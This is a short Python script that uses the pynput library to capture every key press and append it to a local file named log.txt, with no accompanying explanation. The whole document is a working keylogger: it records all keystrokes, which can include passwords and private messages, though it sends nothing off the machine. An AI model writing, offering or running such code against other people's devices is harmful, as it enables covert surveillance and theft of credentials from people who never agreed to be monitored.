from pynput.keyboard import Listener

def log_keystroke(key):
    with open("log.txt","a")as file:
        file.write(str(key)+"\n")
        
with Listener(on_press=log_keystroke) as listener:
    listener.join()